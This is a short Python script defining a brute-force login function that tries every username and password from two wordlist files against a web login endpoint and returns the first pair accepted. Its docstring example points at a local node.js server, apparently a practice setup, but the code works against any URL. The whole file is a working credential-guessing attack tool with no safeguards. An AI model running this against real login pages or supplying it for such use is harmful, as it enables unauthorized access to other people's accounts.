import requests

"""
Takes in a url and username/password formats, then attempts to log in using a dictionary of usernames and passwords.

Returns a string containing the successful username and password combination

Example:
Call once you've ran the node.js server:
brute_force_login(`http://localhost:3000/auth`, 'username', 'password')
"""


def brute_force_login(url, username_format, password_format):
    passlist = open('passwords.txt').read().splitlines()
    userlist = open('usernames.txt').read().splitlines()
    for username in userlist:
        for password in passlist:
            resp = requests.post(url, data={username_format: username, password_format: password})
            if resp.status_code == 200:
                return f"Successful login with username: '{username}', password: '{password}', host: '{url}\'n'"
            else:
                print(f"Failed login with username: '{username}', password: '{password}', host: '{url}'")
